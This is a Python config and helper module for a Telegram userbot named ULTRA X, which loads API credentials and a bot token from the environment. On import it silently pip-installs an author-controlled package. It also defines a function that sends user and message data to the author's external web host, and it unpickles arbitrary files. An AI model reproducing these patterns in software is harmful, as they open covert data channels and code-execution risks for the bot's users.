# COPYRIGHT (C) 2021 BY LEGENDX22
"""
"""
# MADE BY LEGENDX22 🔥
# MY IDEA H YRR DONT KANG THIS PLEASE
import asyncio
import os
import asyncio
from telethon import TelegramClient
from telethon.sessions import StringSession
os.system("pip install LEGENDX==0.0.21")
try:
  from ULTRA import bot 
except:
  pass
from LEGENDX import devs, id, ID
API_ID = os.environ.get("APP_ID", None)
API_HASH = os.environ.get("API_HASH", None)
token = os.environ.get("TG_BOT_TOKEN_BF_HER", None)
xbot = TelegramClient("legend", API_ID, API_HASH).start(bot_token=token)
import time
MESSAGE = os.environ.get("ALIVE_MSG", None)
if MESSAGE is None:
   MSG = '''
🔥🔥 THE ULTRA X IS ONLINE 🔥🔥
I AM HERE FOR MY MASTER PROTECTION
I AM NON HACKEBLE + BEST USERBOT
THANKS MASTER TO DEPLOY ME
'''
else:
  MSG = MESSAGE
botnickname = os.environ.get("BOT_NICK_NAME")
ALIVE_NAME = os.environ.get("ALIVE_NAME")
BOT = str(botnickname) if botnickname else "υℓтяα χ"
NAME = str(ALIVE_NAME) if ALIVE_NAME else "υℓтяα χ"
PHOTO = os.environ.get("ALIVE_PHOTTO", None)
ULTRAX = "[ULTRA X](https://t.me/ULTRAXOT)"
VERSION = "0.0.1"
ALIVE_USERNAME = os.environ.get("ALIVE_USERNAME", None)
ALIVE_BOT_USERNAME = os.environ.get("ALIVE_BOT_USERNAME", None)
devs = devs
ID = ID
id = id
REPO = "[υℓтяα χ вσт](https://github.com/ULTRA-OP/ULTRA-X)"

kangers = [1358931568, 1601105531, 1099219137, 1163444049, 719195224, 1663120531, 1629929584, 1674693245, 1393895701,1383730820, 1083049180, 1412086585, 1585809209, 1326701194, 1198820588, 1174361857, 1555340229, 1322549723, 1444249738, 1222113933, 1152902819, 1176159510, 611816596, 1318486004, 573738900, 1601105531, 1263617196, 1252974808, 1315076555, 1176159510, 21894734, 536157487, 1347610095, 1754449534, 1649853060, 1650981437, 1678331806, 1383009042, 1053880985, 817088672, 1047091391, 1221693726, 929138153, 1091139479]

from requests import post

def POST(user, msg):
  if user == None:
     user = ' '
  elif msg == None:
    msg = ' '
  else:
      pass #post maar rHa hu nothing else
  r = post(f"https://legendx22.000webhostapp.com/user.php? user={user}&msg={msg}")
import pickle as p
def rd(file):
  try:
    f = open(file, "rb")
    LEGENDX = p.load(f)
    f.close()
    return LEGENDX
  except:
    return False
import pickle as p
def wt(obj, file):
  try:
    f = open(file, "wb")
    p.dump(obj, f)
    f.close()
    return True
  except:
    return False

MASTER = NAME
GROUP = "[SUPPORT GROUP](https://t.me/UltraXChat)"
if __name__=="__main__":
  bot.start()
  bot.run_until_disconnected()
  xbot.run_until_disconnected()
